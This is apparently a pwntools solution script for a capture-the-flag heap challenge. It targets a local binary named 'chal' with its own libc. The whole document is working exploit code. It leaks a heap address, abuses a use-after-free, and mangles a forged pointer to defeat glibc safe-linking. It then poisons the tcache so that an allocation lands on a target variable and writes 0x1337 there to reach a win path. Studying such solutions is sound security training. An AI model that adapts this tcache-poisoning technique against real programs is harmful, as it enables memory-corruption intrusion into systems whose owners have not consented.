from pwn import *
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")                                                                                                                                                                                                                    
ld = ELF("./ld-linux-x86-64.so.2")
p = process(elf.path)

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def malloc(size, content):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b">", size)
    p.sendafter(b">", content)

def free(idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b">", idx)

def view(idx, buffer):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", idx)
    p.sendlineafter(b">", b"1")
    p.recvuntil(b"Here it is! Your self-decorated cell!")
    p.recvline()
    if buffer is None:
        data = p.recvline()
        return data
    p.recvuntil(buffer)
    data = p.recv(6)
    return data

def edit(idx, new_content):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", idx)
    p.sendlineafter(b">", b"2")
    p.sendafter(b">", new_content)

def heap_leak():
    p.sendlineafter(b">", b"1337")
    p.recvuntil(b"Do what you will with this:")
    heap_leak = int(p.recvline().decode().strip(), 16)
    return heap_leak


win_var_leak = heap_leak()
malloc(b"100", b"bruh")
free(b"0")
heap_leak = u64(view(b"0", None).strip().ljust(8, b"\x00"))
heap_base = heap_leak << 12
malloc(b"100", b"bruh")
malloc(b"100", b"bruhbruh")
free(b"1")
free(b"2")
edit(b"2", p64(mangle(heap_base + 0x210, win_var_leak & ~0xf)))
malloc(b"100", b"bruhbruhbruh")
malloc(b"100", p64(0x1337))
p.sendlineafter(b">", b"4")
print(p.recvuntil(b"\n").decode().strip())
p.sendlineafter(b">", b"exit")
p.interactive()


